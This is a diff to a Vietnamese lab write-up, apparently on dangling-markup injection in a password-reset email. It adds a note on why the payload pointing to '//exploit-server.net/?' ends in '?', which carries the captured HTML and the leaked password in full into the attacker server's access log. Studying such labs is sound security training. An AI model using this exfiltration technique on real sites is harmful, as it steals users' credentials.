@@ -190,6 +190,13 @@ GET /?/login'>click%20here</a></p><p>Your%20new%20password%20is:%20iFUnGERZYB HT
 
 Trích xuất được mật khẩu tạm thời của tài khoản carlos là: `iFUnGERZYB`.
 
+> [!NOTE]
+> **Tại sao yêu cầu trong Access log lại có định dạng `GET /?/login'>...` (có dấu `?`)?**
+>
+> 1. **Phân định ranh giới Query String (RFC 3986):** Dấu `?` ở cuối payload (`//exploit-server.net/?`) đóng vai trò phân tách phần đường dẫn thư mục gốc (`/`) và bắt đầu chuỗi truy vấn (`query string`). Toàn bộ khối văn bản HTML và mật khẩu phía sau được chuyển thành nội dung của tham số truy vấn gửi lên máy chủ tấn công.
+> 2. **Tránh lỗi đường dẫn máy chủ:** Nếu không có dấu `?`, toàn bộ chuỗi ký tự lạ (`<`, `>`, `'`, dấu cách...) sẽ bị trình duyệt coi là đường dẫn URL Path. Web server thường kiểm duyệt rất khắt khe ký tự trong Path và sẽ từ chối xử lý bằng mã lỗi `400 Bad Request` hoặc `404 Not Found`. Trong khi đó, phần Query String cho phép truyền tự do các ký tự URL-encoded.
+> 3. **Đảm bảo ghi nhận trọn vẹn vào nhật ký:** Máy chủ web luôn lưu trữ đầy đủ toàn bộ chuỗi Query String trong file Access log. Kẻ tấn công chỉ cần mở nhật ký truy cập là có thể đọc được chính xác mật khẩu của nạn nhân mà không bị cắt ngắn dữ liệu.
+
 ![Hình 9: Nhật ký Access log trên Exploit Server ghi nhận mật khẩu bị trích xuất của Carlos](extracted_images/image9.png)
 
 ---
